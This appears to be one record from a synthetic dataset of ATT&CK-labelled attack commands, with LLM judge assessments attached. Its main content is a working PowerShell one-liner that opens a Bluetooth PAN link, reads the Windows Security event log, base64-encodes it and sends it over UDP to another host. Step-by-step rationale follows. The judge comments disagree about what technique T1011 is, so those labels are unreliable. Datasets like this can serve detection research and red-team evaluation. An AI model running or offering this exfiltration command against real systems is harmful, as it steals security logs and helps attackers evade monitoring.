command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\System32\winevt\Logs\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()
explanation: Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).
rationale_steps: Connect to Bluetooth NAP to establish the alternate medium.
Configure the Bluetooth IP using netsh, avoiding common interfaces.
Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.
Send base64 data to a high-numbered, uncommon UDP port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and object creation.
llm_judgments.semantic_justification: The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a Bluetooth connection and exfiltrating event logs over UDP, though it doesn't directly implement data destruction as described in the technique description.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, balanced elements, and appropriate command separators for a complex one-liner.
llm_judgments.semantic_justification: The command explicitly performs data exfiltration (reading a log file and sending it via UDP), which is diametrically opposed to the described intent of T1011 Data Destruction.

llm_judgments.syntactic_justification: PowerShell invocation, quoting, separators, and object usage are well-formed and parseable with valid cmdlets and parameters.
llm_judgments.semantic_justification: It aligns with T1011 by attempting Bluetooth PAN exfiltration, but practical execution is doubtful due to likely need for admin to set adapter IP and read Security.evtx, potential netsh syntax/gateway issues, and sending a very large base64 payload in a single UDP datagram.
